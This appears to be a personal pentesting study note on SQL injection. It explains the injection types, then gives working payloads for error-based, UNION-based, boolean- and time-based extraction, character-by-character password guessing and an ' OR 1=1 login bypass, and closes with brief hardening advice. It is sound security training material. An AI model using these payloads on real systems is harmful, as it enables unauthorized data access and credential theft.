---
tags:
  - type/tech-specific 
  - attack/execution/server-side  #tactic/exfiltration #tactic/credential-access 
---
# Fundamentals
SQL Basics:  [[2 Tech-Specifics/Database/Overview - Database|Overview - Database]]

There are 3 basic types of SQL injection:
- **in-band:** the same communication medium is used for exploit and receiving the results (eg. a webpage)
- **blind:** the results are not reflected back to the user, but some other hint (e.g. time delays) can be used as indicator
- **out of band:** the medium to send queries and to receive information are not the same
### Entrypoint:
- every user-controlled input, that is then used in a database query
### Impacts:
- reading/writing data in the database
- reading/writing files on the target system
- code execution - e.g. by creating a webshell
# Pentesting
## Automated testing
Fast, works well, but VERY noisy
Tools:
- [[3 Tools/database/sqlmap|sqlmap]]
## Manual testing
Can be a lot stealthier than automated testing
apart from the snippets above, use the following generic techniques:
- single `'` or `"` to end the string passed to the sql query
- then either continue the query eg. with an`OR` or  `UNION` statement or if the db allows stacked queries concatenate another query:
	- end a query with `;` then add the next query
- always end by commenting the rest of the legitimate query in the backend out: `-- //`
### Implementation specific methods
The exact sql syntax varies for different databases - check: [[2 Tech-Specifics/Database/Overview - Database#Implementation specifics|Implementation Specifics]]
### Generic methods
Bypass filters using [[2 Tech-Specifics/Web/WebApp Attacks/Injection Attacks/Filter Bypassing - Injection|Filter Bypassing - Injection]]
#### In-Band SQL Injection
##### Error-Based
- error messages are directly printed to browser screen
- discover: break SQL query until an error message is produced 
	
####### Workflow
you can craft an error to contain information that we want to extract
	- e.g. `' or 1=1 in (select @@version) -- //` to make the database version of a mysql database show up in the error message
	- e.g. `' OR 1=1 in (SELECT * FROM users) -- //` to dump the whole user table 
		- if that does not work, query one column at a time - e.g. ` or 1=1 in (SELECT id FROM users) -- //`
		- then you can grab the password hash of one of the users
##### Union-Based 
- See [[2 Tech-Specifics/Database/Overview - Database#UNION|UNION Statement]]
- use union operator + select to add additional data to the legitimate results
- most common way to extract large amounts of data
###### Workflow
you must satisfy the two conditions of the UNION statement
While testing make sure the legitimate results are shown, e.g. by providing a valid query or a wild card query (`%`).
1. the number of columns must match
	- use `' ORDER BY <NUMBER> -- //` to find out the number of columns
		- this statement sorts the result by the supplied column number - if the column does not exist, it fails --> start with 1 and iterate
		- alternatively, use `%' UNION SELECT 'a1' -- //` and successively add columns
2. the datatype of each column must match the one of the legitimate data
	- use `%' UNION SELECT 'a1', 'a2', 'a3', 'a`...`' -- //`to see which column is represented where in the output
	- the you can try to infer the datatype from the data and match columns in the union statement accordingly
Based on that information, craft the union statement - use `null`to not add data to a specific column
e.g. show database information: `' UNION SELECT database(), user(), null, @@version, null -- //`
e.g. show tables and their columns in the active database: `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
#### Blind SQL Injection
##### Boolean-based SQL Injection
###### Workflow
1. find something on the website that changes if the query is true/false.
2. then you can start enumerating and building the sql query step by step: 
	1. check how many colums the current table has `%' UNION SELECT 1;--`, iteratively add columns 1,2,3,... until it shows true
	2. enumerate
		1) database name
		2) table name
		3) columns
		4) rows
Example:`%' UNION SELECT 1,2,3 where database() like 's%';--`
- try different characters in the like statement to find out the first character, then continue with the second character,...
- later on the statement looks like this: `%' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
##### Time-based SQL Injection
###### Workflow
the sleep() function is used - it is only executed upon a successful UNION statement -> you can check if your query is true based on the resulting delay

1. eg. start with finding out the number of columns: `%' UNION SELECT SLEEP(5),2;--`
	- alternatively, in [[2 Tech-Specifics/Database/MySQL|MySQL]] you can also use an IF statement: `IF(2>1, sleep(5), "NO");`
2. as with boolean based SQLi, craft the query step by step
3. later the statement looks like this: `%' UNION SELECT SLEEP(5),2 from users where username='admin' and password like 'a%';`
#### Out of band SQL Injection
medium to send queries and to receive information is not the same
1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.
2) The Website makes an SQL query to the database which also passes the hacker's payload.
3) The payload contains a code that forces an HTTP request back to the hacker's machine containing data from the database.
### Authentication bypass
databases often just check if the credentials are a valid pair (can be found in a table) and then return true/false
example request to make the database return true:

```sql
select * from users where username='' and password='' OR 1=1; -- //
``` 

(in password field the input was `' OR 1=1; -- //`, which always returns true)
Note: the `//` helps to keep the necessary whitespace, even if the webapp truncates whitepace at the end of the input
### Code Execution
See [[#Implementation specific methods]]
# Hardening
1) prepared queries: SQL queries are prepared and the use input is just filled in
2) input validation: allow-list on user input characters
3) escaping user input: puts a \ bevor any special characters -> they are interpreted as normal string


